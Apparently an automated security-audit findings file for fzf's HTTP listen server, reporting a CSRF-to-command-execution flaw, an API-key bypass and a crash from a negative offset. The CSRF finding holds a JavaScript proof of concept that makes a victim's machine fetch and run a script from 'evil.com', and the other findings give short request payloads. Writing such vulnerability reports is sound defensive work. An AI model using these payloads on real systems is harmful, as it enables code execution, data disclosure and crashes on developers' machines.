@@ -1,0 +1,47 @@
+[
+  {
+    "finding_id": "3994019b-afc8-5b49-bcf5-07b6498c3b5b",
+    "session_id": "ChAxNzU2NTk4MjI2YzRhNjRlEAgaATAqBG1haW4",
+    "title": "fzf HTTP Server Local Cross-Site Request Forgery (CSRF) leading to Remote Code Execution (RCE)",
+    "file_path": "/home/jfplante_google_com/repos/p14-fzf_rep1/src/server.go",
+    "severity": "HIGH",
+    "confidence": 100,
+    "analysis": "### Source\nA cross-origin HTTP `POST` request originating from a web browser (Cross-Site Request Forgery).\n\n### Sanitization/Validation\nWhen `fzf` is started with the `--listen` option on localhost (which is the default, e.g., `fzf --listen` or `fzf --listen=127.0.0.1:1234`), `fzf` does not require or enforce setting `FZF_API_KEY`. \nFurthermore, the custom HTTP server in `src/server.go` does not perform any validation of:\n- `Origin` header\n- `Referer` header\n- `Host` header\n- CSRF tokens or custom headers (such as requiring a specific content-type like `application/json` since it accepts raw POST bodies of any type).\n\n### Sink\nSince `t.listenAddr.IsLocal()` is `true` for localhost connections, `src/terminal.go` permits all actions including `actExecute`, `actExecuteSilent`, and `actBecome` (lines 3627-3628):\n```go\nif t.listenAddr == nil || t.listenAddr.IsLocal() || t.listenUnsafe {\n    actions = serverActions\n```\nThese actions execute arbitrary system shell commands directly on the host machine.\n\n### Conceptual Exploit Payload\nIf a developer runs `fzf --listen=127.0.0.1:1234` locally (which is common for shell/editor integration), and then visits any malicious or compromised website (`http://evil.com`), the website can execute arbitrary shell commands on the developer's machine by performing a cross-origin `POST` request to `localhost:1234`.\n\nUsing JavaScript running in the user's browser, the attacker can scan local ports and then send:\n```javascript\nfetch('http://127.0.0.1:1234/', {\n  method: 'POST',\n  mode: 'no-cors',\n  headers: {\n    'Content-Type': 'text/plain'\n  },\n  body: 'execute(curl http://evil.com/malicious.sh | sh)'\n});\n```\nThis payload bypasses browser SOP (Single Origin Policy) because `mode: 'no-cors'` allows simple cross-origin POST requests. The `fzf` custom server will process the request body, parse `execute(curl ... | sh)` as a valid action, and execute it without any user interaction or validation.",
+    "snippet": "func (server *httpServer) handleHttpRequest(conn net.Conn) string {\n\tcontentLength := 0\n\tapiKey := \"\"\n\tbody := \"\"\n...\n\tif len(server.apiKey) != 0 \u0026\u0026 subtle.ConstantTimeCompare([]byte(apiKey), server.apiKey) != 1 {\n\t\treturn unauthorized(\"invalid api key\")\n\t}\n\n\tif len(body) \u003c contentLength {\n\t\treturn bad(\"incomplete request\")\n\t}\n\tbody = body[:contentLength]\n\n\tactions, err := parseSingleActionList(strings.Trim(string(body), \"\\r\\n\"))\n\tif err != nil {\n\t\treturn bad(err.Error())\n\t}\n\tif len(actions) == 0 {\n\t\treturn bad(\"no action specified\")\n\t}\n\n\tselect {\n\tcase server.actionChannel \u003c- actions:\n\tcase \u003c-time.After(channelTimeout):\n\t\treturn httpUnavailable + crlf\n\t}\n\treturn httpOk + crlf\n}",
+    "vuln_type": "Cross-Site Request Forgery (CSRF)",
+    "vuln_id": "CWE-352",
+    "status": "OPEN",
+    "start_line": 130,
+    "end_line": 231
+  },
+  {
+    "finding_id": "c133bb8a-6beb-50f8-828d-8cfe53b99396",
+    "session_id": "ChAxNzU2NTk4MjI2YzRhNjRlEAgaATAqBG1haW4",
+    "title": "fzf HTTP Server GET API Key Authentication Bypass / Information Disclosure",
+    "file_path": "/home/jfplante_google_com/repos/p14-fzf_rep1/src/server.go",
+    "severity": "HIGH",
+    "confidence": 100,
+    "analysis": "### Source\nAn HTTP `GET` request sent to the `fzf` HTTP server (started via the `--listen` option).\n\n### Sanitization/Validation\nThe `FZF_API_KEY` verification check is defined at lines 209-211:\n```go\nif len(server.apiKey) != 0 \u0026\u0026 subtle.ConstantTimeCompare([]byte(apiKey), server.apiKey) != 1 {\n    return unauthorized(\"invalid api key\")\n}\n```\nHowever, this check is placed at the end of the `handleHttpRequest` function, after the request-reading loop terminates. If the request is a `GET` request, the parser immediately matches it in the first iteration of the loop (line 166-167) and executes the `actResponse` action. It then returns the response using either `return good(response)` (line 171) or `return answer(...)` (line 177). \n\nThis early return bypasses the subsequent `FZF_API_KEY` authentication check completely.\n\n### Sink\nThe `server.actionChannel` receives the `actResponse` action (line 168):\n```go\nserver.actionChannel \u003c- []*action{{t: actResponse, a: getMatch[1]}}\n```\nThis action is handled by the terminal main loop, which dumps the entire current state of `fzf`, including search queries, total match count, selected items, and matched item contents, returning them directly to the unauthenticated GET client.\n\n### Conceptual Exploit Payload\nIf the user runs `fzf` with a port and an API key:\n```bash\nFZF_API_KEY=\"my_highly_secure_key\" fzf --listen=0.0.0.0:1234\n```\nAn attacker can bypass the API key and dump all search state and matched list items by sending a simple unauthenticated HTTP GET request:\n```http\nGET / HTTP/1.1\nHost: \u003cvictim-ip\u003e:1234\n\n\n```\nThis returns the full JSON status of the terminal immediately without requiring the `X-API-Key` header.",
+    "snippet": "\t\t\tgetMatch := getRegex.FindStringSubmatch(text)\n\t\t\tif len(getMatch) \u003e 0 {\n\t\t\t\tserver.actionChannel \u003c- []*action{{t: actResponse, a: getMatch[1]}}\n\t\t\t\tselect {\n\t\t\t\tcase response := \u003c-server.responseChannel:\n\t\t\t\t\treturn good(response)\n\t\t\t\tcase \u003c-time.After(channelTimeout):\n\t\t\t\t\tgo func() {\n\t\t\t\t\t\t// Drain the channel\n\t\t\t\t\t\t\u003c-server.responseChannel\n\t\t\t\t\t}()\n\t\t\t\t\treturn answer(httpUnavailable+jsonContentType, `{\"error\":\"timeout\"}`)\n\t\t\t\t}\n\t\t\t}",
+    "vuln_type": "Missing Authentication for Sensitive Function",
+    "vuln_id": "CWE-306",
+    "status": "OPEN",
+    "start_line": 166,
+    "end_line": 179
+  },
+  {
+    "finding_id": "e887ab5b-e7f7-5751-838b-5abc7452a12e",
+    "session_id": "ChAxNzU2NTk4MjI2YzRhNjRlEAgaATAqBG1haW4",
+    "title": "fzf HTTP Server Remote Denial of Service via Negative Offset Integer Panic",
+    "file_path": "/home/jfplante_google_com/repos/p14-fzf_rep1/src/terminal.go",
+    "severity": "HIGH",
+    "confidence": 100,
+    "analysis": "### Source\nUntrusted user input via the `offset` (and/or `limit`) query parameters on an HTTP `GET` request.\n\n### Sanitization/Validation\nIn `src/server.go`, the `parseGetParams` function extracts these query parameters:\n```go\nif val, err := strconv.Atoi(parts[1]); err == nil {\n    if parts[0] == \"limit\" {\n        params.limit = val\n    } else {\n        params.offset = val\n    }\n}\n```\nHowever, there is no validation to ensure that `params.offset` and `params.limit` are greater than or equal to 0. A negative integer (e.g. `-1`) is accepted and stored in the `getParams` struct.\n\n### Sink\nIn `src/terminal.go`, the `dumpStatus` function processes these parameters to retrieve matching and selected items:\n```go\nselected := make([]StatusItem, util.Max(0, util.Min(params.limit, len(selectedItems)-params.offset)))\nfor i := range selected {\n    selected[i] = t.dumpItem(selectedItems[i+params.offset].item)\n}\n\nmatches := make([]StatusItem, util.Max(0, util.Min(params.limit, t.merger.Length()-params.offset)))\nfor i := range matches {\n    matches[i] = t.dumpItem(t.merger.Get(i + params.offset).item)\n}\n```\nIf `params.offset` is negative (e.g., `-1`), then:\n1. `len(selectedItems) - params.offset` = `0 - (-1)` = `1`.\n2. `selected` slice is initialized with length `1`.\n3. In the loop, when `i = 0`, the code attempts to access `selectedItems[0 + (-1)]` which is `selectedItems[-1]`. This negative array indexing immediately causes a Go runtime panic.\n4. Similarly, `t.merger.Get(i + params.offset)` will be called with a negative index argument, causing an out-of-bounds read and panic inside `Merger.Get`.\n\nBecause Go panics are unhandled in this custom HTTP server handler, the entire `fzf` application instantly crashes.\n\n### Conceptual Exploit Payload\nA remote or local attacker can crash a running `fzf` process that has `--listen` enabled by sending the following HTTP request:\n```http\nGET /?offset=-1 HTTP/1.1\nHost: \u003cvictim-ip\u003e:\u003cport\u003e\n\n\n```\nThis will trigger:\n`panic: runtime error: index out of range [-1]`\nand completely terminate the fzf process.",
+    "snippet": "\tselectedItems := t.sortSelected()\n\tselected := make([]StatusItem, util.Max(0, util.Min(params.limit, len(selectedItems)-params.offset)))\n\tfor i := range selected {\n\t\tselected[i] = t.dumpItem(selectedItems[i+params.offset].item)\n\t}\n\n\tmatches := make([]StatusItem, util.Max(0, util.Min(params.limit, t.merger.Length()-params.offset)))\n\tfor i := range matches {\n\t\tmatches[i] = t.dumpItem(t.merger.Get(i + params.offset).item)\n\t}",
+    "vuln_type": "Improper Validation of Specified Index, Property, or Position",
+    "vuln_id": "CWE-1285",
+    "status": "OPEN",
+    "start_line": 4713,
+    "end_line": 4722
+  }
+]
